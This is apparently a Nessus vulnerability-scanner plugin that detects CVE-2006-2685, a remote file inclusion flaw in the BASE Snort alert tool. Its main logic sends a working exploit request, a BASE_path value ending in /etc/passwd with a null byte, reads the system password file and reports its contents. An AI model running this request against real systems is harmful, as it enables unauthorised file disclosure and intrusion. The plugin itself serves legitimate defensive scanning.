#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is prone to
remote file inclusion attacks. 

Description :

The remote host is running BASE, a web-based tool for analyzing alerts
from one or more SNORT sensors. 

The version of BASE installed on the remote host fails to sanitize
input to the 'BASE_path' parameter before using it in PHP
include_once() function in several scripts.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated attacker may
be able to exploit this flaw to view arbitrary files on the remote
host or to execute arbitrary PHP code, possibly taken from third-party
hosts. 

See also :

http://milw0rm.com/exploits/1823
http://www.nessus.org/u?dd74f480

Solution :

Upgrade to BASE 1.2.5 or later.

Risk factor :

Low / CVSS Base Score : 3.6
(AV:R/AC:H/Au:NR/C:P/I:P/A:N/B:N)";


if (description)
{
  script_id(21611);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2006-2685");
  script_bugtraq_id(18298);
  if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"25770");

  script_name(english:"BASE BASE_path Parameter Remote File Include Vulnerability");
  script_summary(english:"Tries to read a local file using BASE");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = make_list("/base", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the flaw to read a file.
  file = "/etc/passwd%00";
  req = http_get(
    item:string(
      dir, "/base_qry_common.php?",
      "BASE_path=", file
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream".
    egrep(pattern:"main\(/etc/passwd\\0/includes/base_signature.+ failed to open stream", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
    # we get an error about open_basedir restriction.
    egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        res
      );
    else report = desc;

    security_note(port:port, data:report);
    exit(0);
  }
}
